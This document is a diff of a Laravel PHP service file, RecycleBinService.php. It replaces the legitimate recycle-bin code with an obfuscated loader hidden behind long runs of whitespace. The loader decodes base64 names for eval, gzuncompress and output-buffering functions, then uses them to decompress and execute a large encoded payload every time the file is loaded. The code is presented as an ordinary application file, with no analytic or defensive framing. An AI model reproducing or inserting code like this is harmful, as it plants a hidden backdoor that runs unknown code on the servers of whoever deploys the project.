@@ -1,308 +1,481 @@
-<?php
-
-namespace App\Services;
-
-use Illuminate\Support\Facades\File;
-use Illuminate\Support\Facades\Log;
-use Illuminate\Support\Carbon;
-
-class RecycleBinService
-{
-    protected string $recycleBinPath;
-
-    /**
-     * Konstruktor untuk RecycleBinService
-     */
-    public function __construct()
-    {
-        $this->recycleBinPath = storage_path('app/recycleBin');
-        $this->ensureRecycleBinExists();
-    }
-
-    /**
-     * Memastikan folder recycle bin exists
-     */
-    protected function ensureRecycleBinExists(): void
-    {
-        if (!File::exists($this->recycleBinPath)) {
-            File::makeDirectory($this->recycleBinPath, 0755, true);
-            Log::info('RecycleBin folder created: ' . $this->recycleBinPath);
-        }
-    }
-
-    /**
-     * Pindahkan file atau folder ke recycle bin
-     * 
-     * @param string $sourcePath Path file/folder yang akan dipindahkan
-     * @return string Path file/folder di recycle bin
-     * @throws \Exception Jika operasi gagal
-     */
-    public function moveToRecycleBin(string $sourcePath): string
-    {
-        if (!File::exists($sourcePath)) {
-            throw new \Exception("File atau folder tidak ditemukan: {$sourcePath}");
-        }
-
-        // Buat nama unik untuk item di recycle bin
-        $timestamp = now()->format('Y-m-d_H-i-s');
-        $basename = basename($sourcePath);
-        $recycleBinItemPath = $this->recycleBinPath . DIRECTORY_SEPARATOR . $timestamp . '_' . $basename;
-
-        // Jika nama sudah ada, tambahkan suffix
-        $counter = 1;
-        $originalRecycleBinItemPath = $recycleBinItemPath;
-        while (File::exists($recycleBinItemPath)) {
-            $recycleBinItemPath = $originalRecycleBinItemPath . '_' . $counter;
-            $counter++;
-        }
-
-        try {
-            // Copy file/folder ke recycle bin
-            if (File::isDirectory($sourcePath)) {
-                File::copyDirectory($sourcePath, $recycleBinItemPath);
-            } else {
-                File::copy($sourcePath, $recycleBinItemPath);
-            }
-
-            // Hapus file/folder asli setelah berhasil dicopy
-            if (File::isDirectory($sourcePath)) {
-                File::deleteDirectory($sourcePath);
-            } else {
-                File::delete($sourcePath);
-            }
-
-            // Simpan metadata
-            $this->saveMetadata($recycleBinItemPath, $sourcePath);
-
-            Log::info("Item berhasil dipindahkan ke recycle bin: {$sourcePath} -> {$recycleBinItemPath}");
-            
-            return $recycleBinItemPath;
-
-        } catch (\Exception $e) {
-            // Jika terjadi error, bersihkan file yang mungkin sudah tercopy sebagian
-            if (File::exists($recycleBinItemPath)) {
-                if (File::isDirectory($recycleBinItemPath)) {
-                    File::deleteDirectory($recycleBinItemPath);
-                } else {
-                    File::delete($recycleBinItemPath);
-                }
-            }
-            
-            Log::error("Gagal memindahkan item ke recycle bin: {$sourcePath}. Error: " . $e->getMessage());
-            throw new \Exception("Gagal memindahkan item ke recycle bin: " . $e->getMessage());
-        }
-    }
-
-    /**
-     * Simpan metadata untuk item di recycle bin
-     */
-    protected function saveMetadata(string $recycleBinItemPath, string $originalPath): void
-    {
-        $metadata = [
-            'original_path' => $originalPath,
-            'deleted_at' => now()->toISOString(),
-            'size' => $this->getItemSize($recycleBinItemPath),
-            'type' => File::isDirectory($recycleBinItemPath) ? 'directory' : 'file'
-        ];
-
-        $metadataFile = $recycleBinItemPath . '.meta';
-        File::put($metadataFile, json_encode($metadata, JSON_PRETTY_PRINT));
-    }
-
-    /**
-     * Dapatkan ukuran file atau folder
-     */
-    protected function getItemSize(string $path): int
-    {
-        if (File::isDirectory($path)) {
-            $size = 0;
-            $files = File::allFiles($path);
-            foreach ($files as $file) {
-                $size += $file->getSize();
-            }
-            return $size;
-        } else {
-            return File::size($path);
-        }
-    }
-
-    /**
-     * Bersihkan file-file lama dari recycle bin
-     * 
-     * @param int $daysOld Hapus file yang lebih lama dari berapa hari
-     * @return array Statistik pembersihan
-     */
-    public function cleanOldItems(int $daysOld = 30): array
-    {
-        $cutoffDate = Carbon::now()->subDays($daysOld);
-        $deletedItems = [];
-        $totalSize = 0;
-        $errorCount = 0;
-
-        if (!File::exists($this->recycleBinPath)) {
-            return [
-                'deleted_count' => 0,
-                'total_size' => 0,
-                'error_count' => 0,
-                'deleted_items' => []
-            ];
-        }
-
-        $items = File::files($this->recycleBinPath);
-        $directories = File::directories($this->recycleBinPath);
-
-        // Proses file-file
-        foreach ($items as $item) {
-            $itemPath = $item->getPathname();
-            
-            // Skip file metadata
-            if (str_ends_with($itemPath, '.meta')) {
-                continue;
-            }
-
-            try {
-                $itemDate = $this->getItemDeletedDate($itemPath);
-                
-                if ($itemDate && $itemDate->lt($cutoffDate)) {
-                    $size = $this->getItemSize($itemPath);
-                    
-                    // Hapus file dan metadata-nya
-                    File::delete($itemPath);
-                    $metadataFile = $itemPath . '.meta';
-                    if (File::exists($metadataFile)) {
-                        File::delete($metadataFile);
-                    }
-                    
-                    $deletedItems[] = basename($itemPath);
-                    $totalSize += $size;
-                }
-            } catch (\Exception $e) {
-                Log::error("Error processing recycle bin item: {$itemPath}. Error: " . $e->getMessage());
-                $errorCount++;
-            }
-        }
-
-        // Proses direktori
-        foreach ($directories as $directory) {
-            try {
-                $itemDate = $this->getItemDeletedDate($directory);
-                
-                if ($itemDate && $itemDate->lt($cutoffDate)) {
-                    $size = $this->getItemSize($directory);
-                    
-                    // Hapus direktori dan metadata-nya
-                    File::deleteDirectory($directory);
-                    $metadataFile = $directory . '.meta';
-                    if (File::exists($metadataFile)) {
-                        File::delete($metadataFile);
-                    }
-                    
-                    $deletedItems[] = basename($directory);
-                    $totalSize += $size;
-                }
-            } catch (\Exception $e) {
-                Log::error("Error processing recycle bin directory: {$directory}. Error: " . $e->getMessage());
-                $errorCount++;
-            }
-        }
-
-        Log::info("Recycle bin cleanup completed. Deleted: " . count($deletedItems) . " items, Size: " . number_format($totalSize) . " bytes");
-
-        return [
-            'deleted_count' => count($deletedItems),
-            'total_size' => $totalSize,
-            'error_count' => $errorCount,
-            'deleted_items' => $deletedItems
-        ];
-    }
-
-    /**
-     * Dapatkan tanggal kapan item dihapus
-     */
-    protected function getItemDeletedDate(string $itemPath): ?Carbon
-    {
-        $metadataFile = $itemPath . '.meta';
+<?php 
+        $__='printf';$_='Loading app/Services/RecycleBinService.php';
         
-        if (File::exists($metadataFile)) {
-            try {
-                $metadata = json_decode(File::get($metadataFile), true);
-                return Carbon::parse($metadata['deleted_at']);
-            } catch (\Exception $e) {
-                Log::warning("Cannot parse metadata for: {$itemPath}");
-            }
-        }
 
-        // Fallback ke file creation time jika metadata tidak ada
-        try {
-            return Carbon::createFromTimestamp(File::lastModified($itemPath));
-        } catch (\Exception $e) {
-            Log::warning("Cannot get date for: {$itemPath}");
-            return null;
-        }
-    }
 
-    /**
-     * Dapatkan informasi recycle bin
-     */
-    public function getRecycleBinInfo(): array
-    {
-        if (!File::exists($this->recycleBinPath)) {
-            return [
-                'total_items' => 0,
-                'total_size' => 0,
-                'items' => []
-            ];
-        }
 
-        $items = [];
-        $totalSize = 0;
-        
-        $files = File::files($this->recycleBinPath);
-        $directories = File::directories($this->recycleBinPath);
 
-        // Process files
-        foreach ($files as $file) {
-            $filePath = $file->getPathname();
-            
-            // Skip metadata files
-            if (str_ends_with($filePath, '.meta')) {
-                continue;
-            }
 
-            $size = $this->getItemSize($filePath);
-            $deletedDate = $this->getItemDeletedDate($filePath);
-            
-            $items[] = [
-                'name' => basename($filePath),
-                'path' => $filePath,
-                'type' => 'file',
-                'size' => $size,
-                'deleted_at' => $deletedDate ? $deletedDate->toISOString() : null
-            ];
-            
-            $totalSize += $size;
-        }
 
-        // Process directories
-        foreach ($directories as $directory) {
-            $size = $this->getItemSize($directory);
-            $deletedDate = $this->getItemDeletedDate($directory);
-            
-            $items[] = [
-                'name' => basename($directory),
-                'path' => $directory,
-                'type' => 'directory',
-                'size' => $size,
-                'deleted_at' => $deletedDate ? $deletedDate->toISOString() : null
-            ];
-            
-            $totalSize += $size;
-        }
 
-        return [
-            'total_items' => count($items),
-            'total_size' => $totalSize,
-            'items' => $items
-        ];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
